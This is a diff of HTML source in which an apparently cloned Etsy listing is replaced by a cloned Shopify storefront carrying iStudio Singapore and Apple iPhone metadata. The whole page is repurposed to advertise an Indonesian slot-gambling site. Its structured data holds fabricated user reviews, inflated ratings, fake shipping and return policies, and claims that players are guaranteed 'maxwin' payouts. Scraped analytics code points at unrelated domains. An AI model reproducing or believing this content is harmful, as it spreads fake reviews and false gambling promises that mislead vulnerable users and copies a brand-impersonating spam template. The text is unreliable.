"SALE_OF_DATA"] }, { "id": "21070004", "eventPayloadVersion": "1", "runtimeContext": "LAX", "scriptVersion": "1", "type": "CUSTOM", "privacyPurposes": ["ANALYTICS", "MARKETING", "SALE_OF_DATA"], "name": "Checkout" }, { "id": "99614900", "eventPayloadVersion": "1", "runtimeContext": "LAX", "scriptVersion": "2", "type": "CUSTOM", "privacyPurposes": ["ANALYTICS", "MARKETING", "SALE_OF_DATA"], "name": "Checkout - Adobe" }, { "id": "shopify-app-pixel", "configuration": "{}", "eventPayloadVersion": "v1", "runtimeContext": "STRICT", "scriptVersion": "0450", "apiClientId": "shopify-pixel", "type": "APP", "privacyPurposes": ["ANALYTICS", "MARKETING"] }, { "id": "shopify-custom-pixel", "eventPayloadVersion": "v1", "runtimeContext": "LAX", "scriptVersion": "0450", "apiClientId": "shopify-pixel", "type": "CUSTOM", "privacyPurposes": ["ANALYTICS", "MARKETING"] }], isMerchantRequest: false, initData: { "shop": { "name": "iStudio Singapore", "paymentSettings": { "currencyCode": "SGD" }, "myshopifyDomain": "istudio-elush-production.myshopify.com", "countryCode": "SG", "storefrontUrl": "https://tunari-online.ro/" }, "customer": null, "cart": null, "checkout": null, "productVariants": [{ "price": { "amount": 1889.0, "currencyCode": "SGD" }, "product": { "title": "SLOT QRIS | LINK SITUS SLOT GACOR TERPERCAYA PASTI MAXWIN DEPOSIT 10K HARI INI", "vendor": "Apple", "id": "8845196638866", "untranslatedTitle": "SLOT QRIS | LINK SITUS SLOT GACOR TERPERCAYA PASTI MAXWIN DEPOSIT 10K HARI INI", "url": "https://tunari-online.ro/", "type": "iPhone" }, "id": "45135258155628", "image": { "src": "https://ik.imagekit.io/ck1mayks8/photo_2025-07-02_14-22-42.jpg", "title": "Default Title", "untranslatedTitle": "Default Title" }], "purchasingCompany": null }, }, "https://www.istudiosg.com/cdn", "101e3747w14cb203ep86935582m63bbd0d5", { "modern": "", "legacy": "" }, { "shopId": "63738642612", "storefrontBaseUrl": "https://tunari-online.ro/", "extensionBaseUrl": "https:\/\/extensions.shopifycdn.com\/cdn\/shopifycloud\/web-pixels-manager", "surface": "storefront-renderer", "enabledBetaFlags": "[\"ac843a20\"]", "isMerchantRequest": "false", "hashVersion": "101e3747w14cb203ep86935582m63bbd0d5", "publish": "custom", "events": "[[\"page_viewed\",{}],[\"product_viewed\",{\"productVariant\":{\"price\":{\"amount\":1889.0,\"currencyCode\":\"SGD\"},\"product\":{\"title\":\"SLOT QRIS | LINK SITUS SLOT GACOR TERPERCAYA PASTI MAXWIN DEPOSIT 10K HARI INI\",\"vendor\":\"Apple\",\"id\":\"8845196638866\",\"untranslatedTitle\":\"SLOT QRIS | LINK SITUS SLOT GACOR TERPERCAYA PASTI MAXWIN DEPOSIT 10K HARI INI\",\"url\":\"https://tunari-online.ro/\",\"type\":\"iPhone\"},\"id\":\"45135258155628\",\"image\":{\"src\":https://ik.imagekit.io/ck1mayks8/photo_2025-07-02_14-22-42.jpg"\",\"title\":\"Default Title\",\"untranslatedTitle\":\"Default Title\"}}]]" });</script>
+    <script>
+        window.ShopifyAnalytics = window.ShopifyAnalytics || {};
+        window.ShopifyAnalytics.meta = window.ShopifyAnalytics.meta || {};
+        window.ShopifyAnalytics.meta.currency = 'SGD';
+        var meta = { "product": { "id": 8845196638866, "gid": "gid:\/\/shopify\/Product\/8845196638866", "vendor": "Apple", "type": "iPhone", "variants": [{ "id": 45135258155628, "price": 188900, "name": "SLOT QRIS | LINK SITUS SLOT GACOR TERPERCAYA PASTI MAXWIN DEPOSIT 10K HARI INI", "public_title": null, "sku": "MG8P4X\/A" }] }, "page": { "pageType": "product", "resourceType": "product", "resourceId": 8845196638866 } };
+        for (var attr in meta) {
+            window.ShopifyAnalytics.meta[attr] = meta[attr];
+        }
+    </script>
+    <script class="analytics">
+        (function () {
+            var customDocumentWrite = function (content) {
+                var jquery = null;
+
+                if (window.jQuery) {
+                    jquery = window.jQuery;
+                } else if (window.Checkout && window.Checkout.$) {
+                    jquery = window.Checkout.$;
+                }
+
+                if (jquery) {
+                    jquery('body').append(content);
+                }
+            };
+
+            var hasLoggedConversion = function (token) {
+                if (token) {
+                    return document.cookie.indexOf('loggedConversion=' + token) !== -1;
+                }
+                return false;
+            }
+
+            var setCookieIfConversion = function (token) {
+                if (token) {
+                    var twoMonthsFromNow = new Date(Date.now());
+                    twoMonthsFromNow.setMonth(twoMonthsFromNow.getMonth() + 2);
+
+                    document.cookie = 'loggedConversion=' + token + '; expires=' + twoMonthsFromNow;
+                }
+            }
+
+            var trekkie = window.ShopifyAnalytics.lib = window.trekkie = window.trekkie || [];
+            if (trekkie.integrations) {
+                return;
+            }
+            trekkie.methods = [
+                'identify',
+                'page',
+                'ready',
+                'track',
+                'trackForm',
+                'trackLink'
+            ];
+            trekkie.factory = function (method) {
+                return function () {
+                    var args = Array.prototype.slice.call(arguments);
+                    args.unshift(method);
+                    trekkie.push(args);
+                    return trekkie;
+                };
+            };
+            for (var i = 0; i < trekkie.methods.length; i++) {
+                var key = trekkie.methods[i];
+                trekkie[key] = trekkie.factory(key);
+            }
+            trekkie.load = function (config) {
+                trekkie.config = config || {};
+                trekkie.config.initialDocumentCookie = document.cookie;
+                var first = document.getElementsByTagName('script')[0];
+                var script = document.createElement('script');
+                script.type = 'text/javascript';
+                script.onerror = function (e) {
+                    var scriptFallback = document.createElement('script');
+                    scriptFallback.type = 'text/javascript';
+                    scriptFallback.onerror = function (error) {
+                        var Monorail = {
+                            produce: function produce(monorailDomain, schemaId, payload) {
+                                var currentMs = new Date().getTime();
+                                var event = {
+                                    schema_id: schemaId,
+                                    payload: payload,
+                                    metadata: {
+                                        event_created_at_ms: currentMs,
+                                        event_sent_at_ms: currentMs
+                                    }
+                                };
+                                return Monorail.sendRequest("https://" + monorailDomain + "/v1/produce", JSON.stringify(event));
+                            },
+                            sendRequest: function sendRequest(endpointUrl, payload) {
+                                // Try the sendBeacon API
+                                if (window && window.navigator && typeof window.navigator.sendBeacon === 'function' && typeof window.Blob === 'function' && !Monorail.isIos12()) {
+                                    var blobData = new window.Blob([payload], {
+                                        type: 'text/plain'
+                                    });
+
+                                    if (window.navigator.sendBeacon(endpointUrl, blobData)) {
+                                        return true;
+                                    } // sendBeacon was not successful
+
+                                } // XHR beacon
+
+                                var xhr = new XMLHttpRequest();
+
+                                try {
+                                    xhr.open('POST', endpointUrl);
+                                    xhr.setRequestHeader('Content-Type', 'text/plain');
+                                    xhr.send(payload);
+                                } catch (e) {
+                                    console.log(e);
+                                }
+
+                                return false;
+                            },
+                            isIos12: function isIos12() {
+                                return window.navigator.userAgent.lastIndexOf('iPhone; CPU iPhone OS 12_') !== -1 || window.navigator.userAgent.lastIndexOf('iPad; CPU OS 12_') !== -1;
+                            }
+                        };
+                        Monorail.produce('www.stevefortexas.com/about/',
+                            'trekkie_storefront_load_errors/1.1',
+                            {
+                                shop_id: 63738642612,
+                                theme_id: 139536236724,
+                                app_name: "storefront",
+                                context_url: window.location.href,
+                                source_url: "//www.istudiosg.com/cdn/s/trekkie.storefront.5a4f78eb26ea594ba1b5d72f179d68114c7cf8ca.min.js"
+                            });
+
+                    };
+                    scriptFallback.async = true;
+                    scriptFallback.src = '//www.istudiosg.com/cdn/s/trekkie.storefront.5a4f78eb26ea594ba1b5d72f179d68114c7cf8ca.min.js';
+                    first.parentNode.insertBefore(scriptFallback, first);
+                };
+                script.async = true;
+                script.src = '//www.istudiosg.com/cdn/s/trekkie.storefront.5a4f78eb26ea594ba1b5d72f179d68114c7cf8ca.min.js';
+                first.parentNode.insertBefore(script, first);
+            };
+            trekkie.load(
+                { "Trekkie": { "appName": "storefront", "development": false, "defaultAttributes": { "shopId": 63738642612, "isMerchantRequest": null, "themeId": 139536236724, "themeCityHash": "10070915975240193969", "contentLanguage": "en", "currency": "SGD" }, "isServerSideCookieWritingEnabled": true, "monorailRegion": "shop_domain" }, "Session Attribution": {}, "S2S": { "facebookCapiEnabled": true, "source": "trekkie-storefront-renderer", "apiClientId": 580111 } }
+            );
+
+            var loaded = false;
+            trekkie.ready(function () {
+                if (loaded) return;
+                loaded = true;
+
+                window.ShopifyAnalytics.lib = window.trekkie;
+
+                var originalDocumentWrite = document.write;
+                document.write = customDocumentWrite;
+                try { window.ShopifyAnalytics.merchantGoogleAnalytics.call(this); } catch (error) { };
+                document.write = originalDocumentWrite;
+
+                window.ShopifyAnalytics.lib.page(null, { "pageType": "product", "resourceType": "product", "resourceId": 8845196638866, "shopifyEmitted": true });
+
+                var match = window.location.pathname.match(/checkouts\/(.+)\/(thank_you|post_purchase)/)
+                var token = match ? match[1] : undefined;
+                if (!hasLoggedConversion(token)) {
+                    setCookieIfConversion(token);
+                    window.ShopifyAnalytics.lib.track("Viewed Product", { "currency": "SGD", "variantId": 45135258155628, "productId": 8845196638866, "productGid": "gid:\/\/shopify\/Product\/8845196638866", "name": "SLOT QRIS | LINK SITUS SLOT GACOR TERPERCAYA PASTI MAXWIN DEPOSIT 10K HARI INI", "price": "1889.00", "sku": "MG8P4X\/A", "brand": "Apple", "variant": null, "category": "iPhone", "nonInteraction": true }, undefined, undefined, { "shopifyEmitted": true });
+                    window.ShopifyAnalytics.lib.track("monorail:\/\/trekkie_storefront_viewed_product\/1.1", { "currency": "SGD", "variantId": 45135258155628, "productId": 8845196638866, "productGid": "gid:\/\/shopify\/Product\/8845196638866", "name": "SLOT QRIS | LINK SITUS SLOT GACOR TERPERCAYA PASTI MAXWIN DEPOSIT 10K HARI INI", "price": "1889.00", "sku": "MG8P4X\/A", "brand": "Apple", "variant": null, "category": "iPhone", "nonInteraction": true, "referer": "https://tunari-online.ro/" });
                 }
             });
 
-            // If you get "parameter 1 is not of type 'Node'" error, see https://stackoverflow.com/a/77855838/492336
-            observer.observe(document.body, {
-                childList: true,
-                subtree: true,
-            });
-        });
-    }
-    function retryLoadingAirgap(loadAsync, attemptNumber) {
-        var element = document.createElement("script");
-        element.type = "text/javascript";
-        element.src = "https://transcend-cdn.com/cm/ac71e058-41b7-4026-b482-3d9b8e31a6d0/airgap.js";
-        if (loadAsync) {
-            element.setAttribute('data-cfasync', true);
-            element.async = true;
-        }
 
-        element.onerror = (error) => {
-            if (attemptNumber < 3) {
-                window.__etsy_logging.eventpipe.logEvent({
-                        event_name: `transcend_cmp_airgap_preliminary_failure`,
-                    airgap_url: 'https://transcend-cdn.com/cm/ac71e058-41b7-4026-b482-3d9b8e31a6d0/airgap.js',
-                    airgap_bundle: 'control_bundle',
-                    error: error,
-                    retryAttempt: attemptNumber,
-                    attemptWasAsyncLoad: loadAsync
-                });
-                retryLoadingAirgap(false, attemptNumber + 1);
-            }
-            else {
-                try {
-                    //ideally we would have the same STATSD here as in transcend-integration.ts
-                    //but we can't import STATSD into mustache files.  This only occurs 0.02% of the time anyway and
-                    //this should work, so tracking in the "happy case" in the ts file should be sufficient.
-                    window.initializePrivacySettingsManager(false);
-                }
-                catch (error) {
-                        waitForElm("#privacy-settings-manager-load-complete").then(()=> {
-                            window.initializePrivacySettingsManager(false);
-                        });
-                }
-                // Update privacy footer based on Airgap info after footer script is loaded.
-                waitForElm("#footer-script-loaded").then(()=> {
-                    window.updatePrivacySettingsFooterTextBasedOnRegime();
-                });
+            var eventsListenerScript = document.createElement('script');
+            eventsListenerScript.async = true;
+            eventsListenerScript.src = "//www.istudiosg.com/cdn/shopifycloud/storefront/assets/shop_events_listener-8675b082.js";
+            document.getElementsByTagName('head')[0].appendChild(eventsListenerScript);
 
-                window.__etsy_logging.eventpipe.logEvent({
-                    event_name: `transcend_cmp_airgap_load_failure`,
-                    airgap_url: 'https://transcend-cdn.com/cm/ac71e058-41b7-4026-b482-3d9b8e31a6d0/airgap.js',
-                    airgap_bundle: 'control_bundle',
-                    error: error,
-                    retryAttempts: attemptNumber
-                });
-            }
-        }
+        })();</script>
+    <script defer src="https://www.istudiosg.com/cdn/shopifycloud/perf-kit/shopify-perf-kit-2.0.7.min.js"
+        data-application="storefront-renderer" data-shop-id="63738642612" data-render-region="gcp-asia-southeast1"
+        data-page-type="product" data-theme-instance-id="139536236724" data-theme-name="Dawn"
+        data-theme-version="11.0.0" data-monorail-region="shop_domain" data-resource-timing-sampling-rate="10"
+        data-shs="true" data-shs-beacon="true"></script>
 
-        var head = document.getElementsByTagName('head')[0];
-        head.appendChild(element);
-    }
 
-    function handleErrorLoadingAirgap() {
-        window.__etsy_logging.eventpipe.logEvent({
-            event_name: `transcend_cmp_airgap_preliminary_failure`,
-            airgap_url: 'https://transcend-cdn.com/cm/ac71e058-41b7-4026-b482-3d9b8e31a6d0/airgap.js',
-            airgap_bundle: 'control_bundle',
-            retryAttempt: 1,
-            attemptWasAsyncLoad: true
-        });
-
-        retryLoadingAirgap(true, 2);
-    }
-</script>
-
-<script data-cfasync="true" data-ui="off" src="https://transcend-cdn.com/cm/ac71e058-41b7-4026-b482-3d9b8e31a6d0/airgap.js" onerror="(function() { handleErrorLoadingAirgap(); })()"  async></script>
-  
-<meta name="robots" content="max-image-preview:large">
-
-<script type="application/ld+json">
- {
+    <script type="application/ld+json">
+{
+  "@context": "https://schema.org/",
   "@type": "Product",
-  "@context": "https://schema.org",
+  "name": "SLOT QRIS | LINK SITUS SLOT GACOR TERPERCAYA PASTI MAXWIN DEPOSIT 10K HARI INI",
+  "image": "https://ik.imagekit.io/ck1mayks8/photo_2025-07-02_14-22-42.jpg",
+  "description": "Slot qris merupakan link situs slot gacor terpercaya pasti maxwin denga minimal deposit hanya 10k sudah bisa mendapatkan maxwin di beragam jenis permainan slot gacor hari ini dengan tingkat kemenangan yang sangat tinggi di permainan slot gacor terbaik hari ini.",
   "url": "https://tunari-online.ro/",
-  "name": "Slot777 | Situs Slot Gacor Terpercaya Hari Ini Rtp Slot Maxwin Terbaik 2025",
-  "sku": "2025124401",
-  "gtin": "n/a",
-  "description": "Slot777 merupakan situs slot gacor terpercaya hari ini dengan tingkat kemenangan yang sangat dengan memiliki rtp slot maxwin yang terbaik untuk para pemain untuk merasakan kemenangan yang tinggi di hari ini.",
-  "image": [{
-   "@type": "ImageObject",
-   "@context": "https://schema.org",
-   "author": "SLOT777",
-   "contentURL": "https://ik.imagekit.io/ck1mayks8/slot777.webp",
-   "description": null,
-   "thumbnail": "https://ik.imagekit.io/ck1mayks8/slot777.webp"
-  }],
-  "category": "SLOT777 < SITUS SLOT < SLOT GACOR",
   "brand": {
-   "@type": "Brand",
-   "@context": "https://schema.org",
-   "name": "SLOT777"
-  },
-  "logo": "https://ik.imagekit.io/ck1mayks8/logo-slot.webp",
-  "aggregateRating": {
-   "@type": "AggregateRating",
-   "ratingValue": "5.0",
-   "reviewCount": 9984
+    "@type": "Brand",
+    "name": "SLOT"
   },
   "offers": {
-   "@type": "Offer",
-   "eligibleQuantity": 500,
-   "price": "100000",
-   "priceCurrency": "IDR",
-   "availability": "https://schema.org/InStock",
-   "shippingDetails": {
-    "@type": "OfferShippingDetails",
-    "shippingRate": {
-     "@type": "MonetaryAmount",
-     "value": "0",
-     "currency": "IDR"
+    "@type": "Offer",
+    "url": "https://tunari-online.ro/",
+    "price": "10000",
+    "priceCurrency": "IDR",
+    "priceValidUntil": "2026-12-31",
+    "availability": "http://schema.org/InStock",
+    "hasMerchantReturnPolicy": {
+      "@type": "MerchantReturnPolicy",
+      "refundType": "http://schema.org/FullRefund",
+      "merchantReturnLink": "https://tunari-online.ro/",
+      "returnPolicyCategory": "https://schema.org/MerchantReturnFiniteReturnWindow",
+      "merchantReturnDays": 30,
+      "returnMethod": "https://schema.org/ReturnByMail",
+      "returnFees": "https://schema.org/FreeReturn",
+      "returnPolicyCountry": {
+        "@type": "Country",
+        "name": "ID"
+      },
+      "applicableCountry": {
+        "@type": "Country",
+        "name": "ID"
+      }
+    },
+    "shippingDetails": {
+      "@type": "OfferShippingDetails",
+      "shippingRate": {
+        "@type": "MonetaryAmount",
+        "value": "50000",
+        "currency": "IDR"
+      },
+      "shippingDestination": {
+        "@type": "DefinedRegion",
+        "addressCountry": {
+          "@type": "Country",
+          "name": "ID"
+        }
+      },
+      "deliveryTime": {
+        "@type": "ShippingDeliveryTime",
+        "cutoffTime": "15:00",
+        "handlingTime": {
+          "@type": "QuantitativeValue",
+          "minValue": 1,
+          "maxValue": 2,
+          "unitCode": "DAY"
+        },
+        "transitTime": {
+          "@type": "QuantitativeValue",
+          "minValue": 2,
+          "maxValue": 3,
+          "unitCode": "DAY"
+        }
+      }
     }
-   }
   },
-  "review": [{
-    "@type": "Review",
-    "reviewRating": { "@type": "Rating", "ratingValue": 5, "bestRating": 5 },
-    "datePublished": "2025-05-21",
-    "reviewBody": "Main slot di SLOT777 terasa nyaman karena gamenya variatif dan nggak ngebosenin. Putarannya halus, tampilannya juga enak dilihat. Buat yang suka cari slot gacor, SLOT777 cukup sering kasih pola permainan yang bikin betah main lama-lama.",
-    "author": { "@type": "Person", "name": "Andi" }
-  },{
-    "@type": "Review",
-    "reviewRating": { "@type": "Rating", "ratingValue": 5, "bestRating": 5 },
-    "datePublished": "2025-04-30",
-    "reviewBody": "Yang saya suka dari SLOT777, pilihan slotnya banyak dan nggak cuma satu provider aja. Jadi bisa ganti-ganti game sesuai mood. Beberapa kali juga kerasa dapet momen enak, apalagi pas event Tahun Baru 2026, peluang maxwin terasa lebih kebuka.",
-    "author": { "@type": "Person", "name": "Budi" }
-  },{
-    "@type": "Review",
-    "reviewRating": { "@type": "Rating", "ratingValue": 5, "bestRating": 5 },
-    "datePublished": "2025-03-18",
-    "reviewBody": "Di SLOT777, main slot bisa disesuaikan sama modal. Nggak harus besar, tapi masih ada peluang dapet hasil. Cocok buat yang mau main santai sambil nyari cuan pelan-pelan. Buat ukuran situs slot gacor resmi, sistemnya terasa fair dan nggak aneh-aneh.",
-    "author": { "@type": "Person", "name": "Rizky" }
-  },{
-    "@type": "Review",
-    "reviewRating": { "@type": "Rating", "ratingValue": 5, "bestRating": 5 },
-    "datePublished": "2025-01-10",
-    "reviewBody": "Situs SLOT777 jarang gangguan, jadi pas main slot nggak kepotong masalah teknis. Ini penting banget, apalagi pas lagi dapet momentum bagus. Secara keseluruhan, SLOT777 layak dicoba buat yang pengin cari maxwin di awal tahun 2026 dengan suasana main yang tenang.",
-    "author": { "@type": "Person", "name": "Deni" }
-  }]
- }
+  "aggregateRating": {
+    "@type": "AggregateRating",
+    "ratingValue": "5",
+    "reviewCount": "99999"
+  }
+}
 </script>
 
-<script type="application/ld+json">
+    <script type="application/ld+json">
 {
   "@context": "https://schema.org",
-  "@type": "FAQPage",
-  "mainEntity": [
+  "@type": "SoftwareApplication",
+  "name": "SLOT QRIS | LINK SITUS SLOT GACOR TERPERCAYA PASTI MAXWIN DEPOSIT 10K HARI INI",
+  "operatingSystem": "Android",
+  "applicationCategory": "EntertainmentApplication",
+  "aggregateRating": {
+    "@type": "AggregateRating",
+    "ratingValue": "5",
+    "bestRating": "5",
+    "ratingCount": "99999"
+  },
+  "offers": {
+    "@type": "Offer",
+    "price": "10000.00",
+    "priceCurrency": "IDR"
+  },
+  "review": [
     {
-      "@type": "Question",
-      "name": "Apa itu Slot777?",
-      "acceptedAnswer": {
-        "@type": "Answer",
-        "text": "Slot777 adalah situs slot gacor yang menyediakan permainan slot maxwin dengan peluang menang maksimal, aman, dan terpercaya, khususnya untuk menyambut Tahun Baru 2026."
+      "@type": "Review",
+      "author": {
+        "@type": "Person",
+        "name": "Rika, Binjai",
+        "datePublished": "2026-01-13"
+      },
+      "reviewBody": "Saya rutin cek rtpslot di Slot Qris karena datanya cepat muncul dan tampilannya jelas. Sangat membantu untuk mencatat hasil harian tanpa harus pindah situs.",
+      "reviewRating": {
+        "@type": "Rating",
+        "ratingValue": "5",
+        "bestRating": "5",
+        "worstRating": "1"
       }
     },
     {
-      "@type": "Question",
-      "name": "Mengapa Slot777 disebut Situs Slot Gacor?",
-      "acceptedAnswer": {
-        "@type": "Answer",
-        "text": "Karena slot777 adalah situs yang menyediakan banyak sekali provider pilihan rtp slot maxwin yang bisa kamu pilih dan mainkan, Dan serta pasti menjaminan kamu pasti mendapatkan kemenangan maxwin setiap hari."
+      "@type": "Review",
+      "author": {
+        "@type": "Person",
+        "name": "Yudis, Medan",
+        "datePublished": "2026-01-15"
+      },
+      "reviewBody": "Situs Gacor selalu update dan konsisten. Informasinya rapi dan gampang dipahami, cocok buat yang fokus analisa data.",
+      "reviewRating": {
+        "@type": "Rating",
+        "ratingValue": "5",
+        "bestRating": "5",
+        "worstRating": "1"
       }
     },
     {
-      "@type": "Question",
-      "name": "Bagaimana cara mendaftar di Slot777?",
-      "acceptedAnswer": {
-        "@type": "Answer",
-        "text": "Cukup kunjungi situs gacor slot777, isi formulir pendaftaran dengan data valid, dan lakukan verifikasi akun. Setelah itu, kamu bisa langsung bermain dan mencoba meraih kemenangan maxwin."
-      }
-    },
-    {
-      "@type": "Question",
-      "name": "Apakah Slot777 aman dimainkan?",
-      "acceptedAnswer": {
-        "@type": "Answer",
-        "text": "Ya, Slot777 merupakan situs slot gacor yang menggunakan sistem keamanan terupdate, sehingga semua data dan transaksi pemain terlindungi dengan baik."
-      }
-    },
-    {
-      "@type": "Question",
-      "name": "Apakah ada bonus atau fitur khusus Tahun Baru 2026?",
-      "acceptedAnswer": {
-        "@type": "Answer",
-        "text": "Slot777 bukan hanya menghadirkan bonus atau promo special tahun baru, Tapi slot gaor menghadirkan promo dan bonus special setiap hari. Dan fitur free spin atau putaran gratis untuk meraih maxwin di tahun 2026."
+      "@type": "Review",
+      "author": {
+        "@type": "Person",
+        "name": "Ardan, Jakarta",
+        "datePublished": "2026-01-15"
+      },
+      "reviewBody": "Akses slot qris cukup stabil baik dari HP maupun laptop. Untuk pantau result Macau resmi, situs ini cukup bisa diandalkan.",
+      "reviewRating": {
+        "@type": "Rating",
+        "ratingValue": "5",
+        "bestRating": "5",
+        "worstRating": "1"
       }
     }
   ]
 }
 </script>
 
-<script type="application/ld+json">
- {
+    <script type="application/ld+json">
+            {
+              "@context": "https://schema.org",
+              "@type": "Article",
+              "mainEntityOfPage": {
+                "@type": "WebPage",
+                "@id": "https://tunari-online.ro/"
+              },
+              "headline": "SLOT QRIS | LINK SITUS SLOT GACOR TERPERCAYA PASTI MAXWIN DEPOSIT 10K HARI INI",
+              "description": "Slot qris merupakan link situs slot gacor terpercaya pasti maxwin denga minimal deposit hanya 10k sudah bisa mendapatkan maxwin di beragam jenis permainan slot gacor hari ini dengan tingkat kemenangan yang sangat tinggi di permainan slot gacor terbaik hari ini.",
+              "image": ["https://ik.imagekit.io/ck1mayks8/photo_2025-07-02_14-22-42.jpg"],
+              "author": {
+                "@type": "Organization",
+                "name": "SLOT",
+                "url": "https://tunari-online.ro/"
+              },
+              "publisher": {
+                "@type": "Organization",
+                "name": "SLOT",
+                "logo": {
+                  "@type": "ImageObject",
+                  "url": "https://ik.imagekit.io/ck1mayks8/logo-slot.webp?updatedAt=1770202951934"
+                }
+              },
+              "datePublished": "2026-01-01T09:00:00+00:00",
+              "dateModified": "2026-01-22T09:00:00+00:00"
+            }
+          </script>
+    </script>
+    <script type="application/ld+json" data-rh="true">
+{
   "@context": "https://schema.org",
   "@type": "BreadcrumbList",
   "itemListElement": [
     {
       "@type": "ListItem",
       "position": 1,
-      "name": "SLOT777",
-      "item": "https://tunari-online.ro/"
+      "item": {
+        "@id": "https://tunari-online.ro/",
+        "name": "SLOT"
+      }
     },
     {
       "@type": "ListItem",
       "position": 2,
-      "name": "SITUS SLOT",
-      "item": "https://tunari-online.ro/"
+      "item": {
+        "@id": "https://tunari-online.ro/",
+        "name": "DATA MACAU"
+      }
     },
     {
       "@type": "ListItem",
       "position": 3,
-      "name": "SITUS SLOT GACOR",
-      "item": "https://tunari-online.ro/"
+      "item": {
+        "@id": "https://tunari-online.ro/",
+        "name": "TOTO MACAU"
+      }
+    },
+    {
+      "@type": "ListItem",
+      "position": 4,
+      "item": {
+        "@id": "https://tunari-online.ro/",
+        "name": "RESULT MACAU"
+      }
+    },
+    {
+      "@type": "ListItem",
+      "position": 5,
+      "item": {
+        "@id": "https://tunari-online.ro/",
+        "name": "LIVEDRAW MACAU"
+      }
+    },
+    {
+      "@type": "ListItem",
+      "position": 6,
+      "item": {
+        "@id": "https://tunari-online.ro/",
+        "name": "KELUARAN MACAU"
+      }
+    },
+    {
+      "@type": "ListItem",
+      "position": 7,
+      "item": {
+        "@id": "https://tunari-online.ro/",
+        "name": "BANDAR TOTO MACAU"
+      }
     }
   ]
- }
-</script>
-        <meta property="al:ios:url" content="etsy://listing/1790774795?ref=applinks_ios" /><meta property="al:ios:app_store_id" content="477128284" /><meta property="al:ios:app_name" content="Etsy" /><meta property="al:android:url" content="etsy://listing/1790774795?ref=applinks_android" /><meta property="al:android:package" content="com.etsy.android" /><meta property="al:android:app_name" content="Etsy" />
-
-
-
-
-        <script nonce="gPiNOjdRCrWLas5Ik2CuS+N0">__webpack_public_path__ = "https://www.etsy.com/ac/evergreenVendor/js/en-GB/";</script>
-
-<style>
-    * {
-    font-family: "Mulish", sans-serif !important;
-    text-decoration: none !important;
 }
-
-    </style>
-
-        <link type="application/opensearchdescription+xml" rel="search" href="/osdd.php" title="Etsy"/>
-    </head>
-    <body class="ui-toolkit transitional-wide etsy-has-it-design is-responsive no-touch en-GB IDR ID"
-        data-language="en-GB"
-        data-currency="IDR"
-        data-region="ID"
-        
-    >
-
-        <script nonce="gPiNOjdRCrWLas5Ik2CuS+N0">
-    !function(a,b,c,d,e,f){a.ddjskey=e;a.ddoptions=f||null;var m=b.createElement(c),n=b.getElementsByTagName(c)[0];m.async=1,m.defer=1,m.src=d,n.parentNode.insertBefore(m,n)}(window,document,"script","https://www.etsy.com/include/tags.js", "D013AA612AB2224D03B2318D0F5B19", {
-        endpoint:"https://www.etsy.com/include/tags.js",
-        ajaxListenerPath: true,
-        enableTagEvents: true,
-        overrideAbortFetch: true,
-        abortAsyncOnChallengeDisplay: true,
-        disableAutoRefreshOnCaptchaPassed: false,
-        replayAfterChallenge: true
-    });
-
-    var DD_BLOCKED_EVENT_NAME = "dd_blocked";
-    var DD_RESPONSE_DISPLAYED_EVENT_NAME = "dd_response_displayed";
-    var DD_RESPONSE_ERROR_EVENT_NAME = "dd_response_error";
-
-    window.addEventListener(DD_RESPONSE_DISPLAYED_EVENT_NAME, function() {
-        if (window.Sentry && window.Sentry.setTag) {
-            window.Sentry.setTag(DD_RESPONSE_DISPLAYED_EVENT_NAME, true);
-        }
-    });
-
-    window.addEventListener(DD_BLOCKED_EVENT_NAME, function() {
-        if (window.Sentry && window.Sentry.setTag) {
-            window.Sentry.setTag(DD_BLOCKED_EVENT_NAME, true);
-        }
-    });
-
-    window.addEventListener(DD_RESPONSE_ERROR_EVENT_NAME, function() {
-        if (window.Sentry && window.Sentry.setTag) {
-            window.Sentry.setTag(DD_RESPONSE_ERROR_EVENT_NAME, true);
-        }
-    });
 </script>
-
-        
-
-        
-
-        <div data-above-header class="wt-z-index-5 wt-position-relative">
-            
-            
-
-        </div>
-
-        <div data-selector="header-cat-nav-wrapper" data-menu-ui="menubar">
-<div id="gnav-header" class=" gnav-header global-nav v2-toolkit-gnav-header wt-z-index-6 wt-bg-white wt-position-relative " data-as-version="10_12672349415_19" data-count-ajax data-show-suggested-searches-in-as="1" data-show-gift-card-cta-in-as="1" data-as-personalized="1" data-as-extras="{&amp;quot;expt&amp;quot;:&amp;quot;all_xml&amp;quot;,&amp;quot;lang&amp;quot;:&amp;quot;en-GB&amp;quot;,&amp;quot;extras&amp;quot;:[]}" data-cheact="1" data-gnav-header>
-    <header id="gnav-header-inner" class="global-enhancements-header wt-display-flex-xs wt-justify-content-space-between wt-align-items-center wt-width-full wt-body-max-width wt-pl-xs-2 wt-pr-xs-2 wt-pl-lg-6 wt-pr-lg-6 wt-bb-xs wt-bb-lg-none gnav-header-inner wt-pt-lg-2 
-        
-        "
-        role="banner">
-
-        <script nonce="gPiNOjdRCrWLas5Ik2CuS+N0">!function(e){var r=e.__etsy_logging;if(r&&r.perf&&r.perf.prefixMarkMeasure){var n=r.perf.prefixMarkMeasure("logo_render");e.performance&&e.performance.mark&&e.requestAnimationFrame((function(){setTimeout((function(){e.performance.mark(n)}))}))}}(window);</script>
-        <div class="wt-pb-lg-0 wt-pt-sm-1 wt-pt-lg-0 wt-pr-xs-0 wt-pr-sm-1 " data-header-logo-container>
-            <a href="/" elementtiming="ux-global-nav">
-                <span class="wt-screen-reader-only">Slot Gacor</span>
-                <img src="https://ik.imagekit.io/ck1mayks8/logo-slot.webp" alt="Slot Gacor" style="max-height:40px;">
-            </a>
-        </div>
-            <nav class="wt-hide-xs wt-show-lg">
-                <div data-clg-id="WtMenu" class="wt-menu wt-tooltip ge-menu--body-below-trigger wt-tooltip--disabled-touch dropdown-category-menu wt-menu--bottom wt-menu--left" data-wt-menu data-wt-tooltip="true" data-menu-body-below-trigger="true" data-close-on-select="true" data-hide-trigger-on-open="false" data-animate-in="true" data-contain-focus="false" data-open-direction-vert="bottom" data-open-direction-horiz="left" data-open-direction-force="true" data-menu-type="action">
-       
-        <button
-          type="button"
-          class="wt-menu__trigger wt-btn wt-btn--transparent header-button wt-mr-xs-1 wt-btn--small"
-          aria-haspopup="true"
-          aria-expanded="false"
-          data-wt-menu-trigger
-          data-level="0"
-          data-overlay-trigger-selector= "overlay-trigger-ele"
-        >
-          <span class="etsy-icon wt-mr-xs-1 wt-icon--smaller">
-            <svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" viewBox="0 0 18 18">
-              <rect x="2" y="8"  width="14" height="2"/>
-              <rect x="2" y="13" width="14" height="2"/>
-              <rect x="2" y="3"  width="14" height="2"/>
-            </svg>
-          </span>
